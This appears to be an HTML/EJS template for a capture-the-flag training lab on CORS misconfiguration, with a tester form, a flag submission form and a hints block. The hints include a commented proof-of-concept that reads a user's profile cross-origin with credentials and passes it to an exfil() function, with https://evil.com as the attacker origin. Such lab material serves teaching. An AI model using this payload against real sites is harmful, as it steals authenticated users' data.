<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1><i class="fas fa-exchange-alt"></i> CORS Misconfiguration</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>The API reflects the Origin header in Access-Control-Allow-Origin without proper validation. Craft a malicious page that steals data from an authenticated user.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> CORS Tester</h2>
      <div class="vulnerable-form">
        <div style="margin-bottom:1rem;">
          <label for="corsOrigin">Origin Header:</label>
          <input type="text" id="corsOrigin" placeholder="https://evil.com" value="https://evil.com">
        </div>
        <div style="margin-bottom:1rem;">
          <label for="corsEndpoint">Target Endpoint:</label>
          <input type="text" id="corsEndpoint" value="/api/user/profile">
        </div>
        <button class="btn" onclick="testCors()"><i class="fas fa-paper-plane"></i> Send Preflight</button>
      </div>
      <div id="corsResults" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">
        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
        <pre>
# Test different origins:
# https://evil.com
# https://hacklab.com.evil.com (subdomain)
# null (sandboxed iframe)

# Exploit: If ACAO reflects our origin + credentials:true
# We can steal authenticated data cross-origin

# PoC payload for victim:
# var xhr = new XMLHttpRequest();
# xhr.open('GET', 'https://target.com/api/user/profile', true);
# xhr.withCredentials = true;
# xhr.onload = function() { exfil(xhr.responseText); };
# xhr.send();
        </pre>
      </div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('advanced-cors','flagInput_cors','flagResult_cors'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_cors" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_cors" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function testCors() {
      const origin = document.getElementById('corsOrigin').value;
      const endpoint = document.getElementById('corsEndpoint').value;
      const resultsDiv = document.getElementById('corsResults');
      try {
        const res = await fetch('/api/labs/advanced/cors', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ origin, endpoint }) });
        const data = await res.json();
        let html = '<h4 style="color:var(--primary)">Response Headers:</h4>';
        html += '<pre style="color:var(--text);white-space:pre-wrap;">' + JSON.stringify(data.headers, null, 2) + '</pre>';
        if (data.vulnerable) html += '<p style="color:#00ff00;margin-top:0.5rem;"><i class="fas fa-exclamation-triangle"></i> CORS is misconfigured! Origin reflected.</p>';
        if (data.data) html += '<h4 style="color:var(--primary);margin-top:1rem;">Stolen Data:</h4><pre style="color:#00ff00;">' + JSON.stringify(data.data, null, 2) + '</pre>';
        resultsDiv.innerHTML = html;
      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
    }
  </script>
</body>
</html>
